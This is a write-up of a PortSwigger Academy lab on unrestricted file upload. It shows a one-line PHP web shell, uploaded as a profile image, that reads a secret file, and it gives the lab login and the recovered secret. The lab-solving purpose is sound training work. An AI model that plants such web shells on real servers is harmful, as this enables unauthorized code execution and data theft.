# Lab Writeup: Remote code execution via web shell upload

URL: https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice/file-upload-apprentice/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload#

## Description

This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

1. Login as `wiener:peter`
2. Create a php file with the following content:

   ```php
   <?php echo file_get_contents('/home/carlos/secret'); ?>
   ```

3. Upload the file as profile image
4. Open the uploaded image in new tab and you'll get the target file content `IRPYIvmvvaPop3e7vlsR5qYGxaI6RBGn`
5. Submit and the challenge is solved
